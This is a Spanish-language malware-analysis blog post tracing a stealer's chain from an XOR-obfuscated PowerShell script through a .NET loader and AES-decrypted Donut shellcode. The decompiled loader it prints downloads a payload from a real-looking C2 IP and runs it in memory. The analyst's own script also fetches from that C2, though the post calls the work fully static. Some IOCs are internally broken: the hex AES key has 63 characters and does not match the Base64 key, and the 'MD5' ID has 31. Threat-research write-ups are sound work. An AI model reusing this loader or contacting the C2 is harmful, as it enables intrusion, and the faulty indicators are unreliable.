---
layout: single
title: "Análisis de un Stealer: de un PS1 ofuscado a shellcode Donut con AES-256"
date: 2026-09-09
categories:
  - malware-analysis
  - reverse-engineering
tags:
  - malware
  - stealer
  - donut
  - aes
  - powershell
  - dnspy
  - ghidra
  - dfir
toc: true
toc_label: "Índice"
toc_icon: "bug"
header:
  teaser: /assets/images/posts/donut-stealer/teaser.png
excerpt: "Análisis completo de una cadena de infección multicapa: script PowerShell ofuscado con XOR → loader .NET que descarga y descifra AES-256-CBC → shellcode Donut → módulo stealer PE32 x64."
---

## Introducción

En este post documento el análisis completo de una cadena de infección que encontré durante una investigación. El vector inicial es un script PowerShell ofuscado que actúa como punto de entrada para cargar un payload más complejo. La cadena completa es la siguiente:

```
PS1 ofuscado (XOR) → Loader .NET → AES-256-CBC → Donut shellcode → Stealer PE32 x64
```

El objetivo de este análisis es documentar cada capa de forma reproducible, sin ejecutar el payload final.

---

## Capa 1 — Script PowerShell con cifrado XOR

El primer artefacto analizado es un script PowerShell con variables con nombres aleatorios. El fragmento clave de descifrado es el siguiente:

```powershell
$smgluhjl = New-Object Byte[] $ewqaz.Length
for($kntng=0; $kntng -lt $ewqaz.Length; $kntng++) {
    $smgluhjl[$kntng] = $ewqaz[$kntng] -bxor 78 -bxor ($kntng % 20)
}
```

### Mecánica del cifrado

- Se aplica XOR de doble clave sobre cada byte del array `$ewqaz`
- **Clave 1:** `78` (constante decimal, 0x4E en hex)
- **Clave 2:** `$kntng % 20` (rotativa, cíclica cada 20 bytes según la posición)
- Como XOR es reversible, el descifrado se realiza con la misma operación sobre el array cifrado

### Script de descifrado

```powershell
$original = New-Object Byte[] $smgluhjl.Length
for ($kntng=0; $kntng -lt $smgluhjl.Length; $kntng++) {
    $original[$kntng] = $smgluhjl[$kntng] -bxor 78 -bxor ($kntng % 20)
}
[System.Text.Encoding]::UTF8.GetString($original)
```

El resultado de descifrar este stage es un **ejecutable .NET** que actúa como loader de la siguiente fase.

---

## Capa 2 — Loader .NET (dnSpy)

El binario .NET se analiza con **dnSpy**. La función `Main` revela la lógica completa del loader:

```csharp
private static void Main()
{
    string text = "http://86.107.168.102/payload.enc";
    using (WebClient webClient = new WebClient())
    {
        byte[] array = webClient.DownloadData(text);

        // Los primeros 16 bytes son el IV
        byte[] array2 = new byte[16];
        // El resto es el ciphertext
        byte[] array3 = new byte[array.Length - 16];

        Buffer.BlockCopy(array, 0, array2, 0, 16);
        Buffer.BlockCopy(array, 16, array3, 0, array3.Length);

        byte[] array4 = Convert.FromBase64String(Loader.base64Key);
        byte[] array5 = Loader.DecryptAes(array3, array4, array2);

        // Ejecución del shellcode resultante en memoria
        IntPtr intPtr = virtualAllocDelegate(IntPtr.Zero, (uint)array5.Length, 12288U, 64U);
        Marshal.Copy(array5, 0, intPtr, array5.Length);
        createThreadDelegate(IntPtr.Zero, 0U, intPtr, IntPtr.Zero, 0U, IntPtr.Zero);
    }
}
```

### Puntos clave

- Descarga `payload.enc` desde el C2
- El formato del archivo es: `[ IV (16 bytes) || Ciphertext ]`
- La clave AES está hardcodeada como campo estático Base64:

```csharp
private static string base64Key = "56faZiKt5Qt0pDIa+mXo9bnY4qKjbHwu2YMbjOTXJgE=";
```

- Tras descifrar, inyecta el resultado directamente en memoria con `VirtualAlloc` + `CreateThread` (sin tocar disco)

### Función de descifrado AES

```csharp
private static byte[] DecryptAes(byte[] cipherText, byte[] key, byte[] iv)
{
    using (Aes aes = Aes.Create())
    {
        aes.Key = key;
        aes.IV = iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using (CryptoStream cryptoStream = new CryptoStream(
                memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(cipherText, 0, cipherText.Length);
            }
            return memoryStream.ToArray();
        }
    }
}
```

---

## Capa 3 — Descifrado del payload AES-256-CBC

Con los parámetros extraídos de dnSpy, replicamos el descifrado manualmente en PowerShell sin ejecutar nada:

```powershell
# Descarga payload.enc
$raw = (New-Object System.Net.WebClient).DownloadData("http://86.107.168.102/payload.enc")

# Extrae IV (primeros 16 bytes) y ciphertext (resto)
$iv  = $raw[0..15]
$ct  = $raw[16..($raw.Length - 1)]

# Clave AES desde Base64
$key = [Convert]::FromBase64String("56faZiKt5Qt0pDIa+mXo9bnY4qKjbHwu2YMbjOTXJgE=")

# Descifrado AES-256-CBC PKCS7
$aes         = [System.Security.Cryptography.Aes]::Create()
$aes.Key     = $key
$aes.IV      = $iv
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$plain = $aes.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)
[System.IO.File]::WriteAllBytes("C:\analysis\payload_dec.bin", $plain)
```

El resultado es un **shellcode Donut**, identificado con **Detect-It-Easy** (`Heur; language: ASM x64, OS: Windows Vista+`).

---

## Capa 4 — Extracción del PE desde Donut

**Donut** es un framework que permite empaquetar cualquier PE (EXE, DLL, .NET assembly) como shellcode position-independent. Para extraer el payload interno usamos **donut-decryptor**:

```bash
pip install donut-decryptor
donut-decryptor payload_dec.bin
```

Esto genera dos archivos:
- `inst_payload` — instancia/configuración de Donut
- `mod_payload` — el módulo real **(PE32 x64)**

---

## Capa 5 — Análisis estático del módulo stealer

El `mod_payload` es un **PE32+ x64 nativo** (no .NET). Análisis de strings en Ghidra (`Window → Defined Strings`):

### Capacidades identificadas

| Capacidad | APIs implicadas |
|---|---|
| **Captura de pantalla** | `BitBlt`, `CreateCompatibleBitmap`, `CreateCompatibleDC`, `GetDC`, `GetDIBits`, `GetForegroundWindow` |
| **Robo de portapapeles** | `GlobalLock`, `GlobalUnlock` |
| **Fingerprinting del sistema** | `GetComputerNameA`, `GetComputerNameExA`, `GetUserNameA`, `GetSystemMetrics` |
| **Idioma / teclado** | `GetKeyboardLayout`, `GetKeyboardLayoutNameA`, `GetKeyboardLayoutNameW` |
| **Enumeración WMI** | `CoCreateInstance`, `CoInitializeSecurity`, `CoSetProxyBlanket` |
| **Comprobación de privilegios** | `LookupPrivilegeValueW` |

### Observaciones

- **No hay APIs de red** en este módulo (`WinHTTP`, `WSAStartup`, `InternetOpen` ausentes) — el módulo solo **recopila** datos; la exfiltración la gestiona `inst_payload`
- El campo hardcodeado `e236440a888641f560a7abe43083771` (MD5) corresponde probablemente a un **Campaign ID o Bot ID** del operador

---

## IOCs

### Red

| Tipo | Valor |
|---|---|
| IP C2 | `86.107.168.102` |
| URL payload | `http://86.107.168.102/payload.enc` |

### Criptografía

| Tipo | Valor |
|---|---|
| AES Key (Base64) | `56faZiKt5Qt0pDIa+mXo9bnY4qKjbHwu2YMbjOTXJgE=` |
| AES Key (Hex) | `E7A65A66222ADE50B74A4321A7A65E8F9B9D8E2A2A367C2ED9831B8CE4D7260` |
| Algoritmo | AES-256-CBC, PKCS7, IV prepended |

### Artefactos

| Tipo | Valor |
|---|---|
| Campaign/Bot ID | `e236440a888641f560a7abe43083771` |
| Packer | Donut (shellcode loader) |
| Arquitectura final | PE32+ x64 |

### Técnicas MITRE ATT&CK

| ID | Técnica |
|---|---|
| T1027 | Obfuscated Files or Information (XOR + Base64 + AES) |
| T1059.001 | Command and Scripting Interpreter: PowerShell |
| T1055 | Process Injection (VirtualAlloc + CreateThread) |
| T1113 | Screen Capture |
| T1115 | Clipboard Data |
| T1082 | System Information Discovery |
| T1083 | File and Directory Discovery |
| T1016 | System Network Configuration Discovery |

---

## Herramientas utilizadas

- **dnSpy** — decompilación del loader .NET
- **Detect-It-Easy** — identificación de packers y arquitectura
- **donut-decryptor** — extracción del PE interno del shellcode Donut
- **Ghidra** — análisis estático del módulo PE nativo
- **PowerShell** — descifrado AES manual y extracción de IV
- **CyberChef** — validación de operaciones criptográficas

---

## Conclusión

Esta muestra implementa una cadena de infección bien estructurada con cuatro capas de ofuscación/cifrado antes de llegar al payload real. El módulo final es un **stealer modular** capaz de capturar pantallas, robar el portapapeles y recopilar información del sistema, separando la recolección de datos de la exfiltración en módulos independientes.

El análisis se realizó **100% estático** — sin ejecutar ningún artefacto — combinando decompilación .NET, análisis de shellcode con Donut y revisión de imports en Ghidra.

---

*Análisis realizado el 09/09/2026 — Cualquier consulta, abrí un issue en el repositorio o contacta vía X.*
